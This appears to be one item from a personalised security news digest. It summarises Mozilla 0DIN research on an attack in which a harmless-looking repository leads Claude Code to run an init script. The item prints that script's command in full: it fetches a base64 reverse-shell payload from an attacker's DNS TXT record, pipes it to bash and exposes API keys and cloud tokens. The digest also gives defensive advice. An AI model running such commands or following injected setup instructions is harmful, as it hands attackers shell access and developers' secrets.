### 3. CC Security: Clone This Repo → Open a Reverse Shell (Mozilla 0DIN Research)
**Source:** SecurityWeek · Mozilla 0DIN · Vibegraveyard · CyberSecurity News · Cybernews · **Score:** 7/10

Mozilla's Zero Day Investigative Network (0DIN) published June 29: a harmless-looking GitHub repo can make Claude Code spawn a reverse shell and hand full system access to an attacker — without any code in the repo being flagged by scanners.

**Attack chain:**
1. Attacker creates a legit-looking repo with a broken "init" setup
2. Error message suggests running `init` to fix it
3. CC helpfully runs `init`; the script does `curl -s "$(dig +short TXT attacker.com)" | base64 -d | bash`
4. DNS TXT record resolves to a base64-encoded reverse shell payload — **never stored in the repo**
5. Attacker gets a full interactive shell under the developer's user privileges + all env secrets: `ANTHROPIC_API_KEY`, `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, etc.

**Why it's nasty:** The payload lives in DNS, not in code. Traditional scanners, code review, and even Claude's own analysis of the repo never see it. The attack works on a **clean repo** that passes every visible inspection. This is the indirect prompt injection class operationalized at the supply chain layer.

**Not the same as the prior CC GitHub Action CVE** (CVSS 7.8, fixed in v1.0.94, June 2026) — that was about PRs hijacking the Actions workflow. This is about what happens when you `cd` into a foreign repo and let CC help with setup.

**What Leo should do:** His fiction pipeline and Jarvis infra work sometimes opens repos from community sources (novel frameworks, CC skills repos). The attack applies most when: (a) opening a new repo for the first time, (b) letting CC run setup/install steps from README or CLAUDE.md, (c) in a session with credentials in the environment. Mitigation: **don't let CC auto-run init/setup commands from unfamiliar repos.** Review setup scripts before approving. The `--safe-mode` flag (CC v2.1.170+) bypasses all CLAUDE.md customizations and is worth using when first exploring a foreign repo.

🔗 https://www.securityweek.com/new-attack-abuses-claude-code-and-harmless-looking-repositories-to-hijack-developer-machines/ · https://cybersecuritynews.com/new-claude-code-attack/

**Build verdict:** INFORMATIONAL — but the `--safe-mode` habit is worth hardening into Leo's repo-exploration workflow. Not a briefing item; note in next relevant skill session.
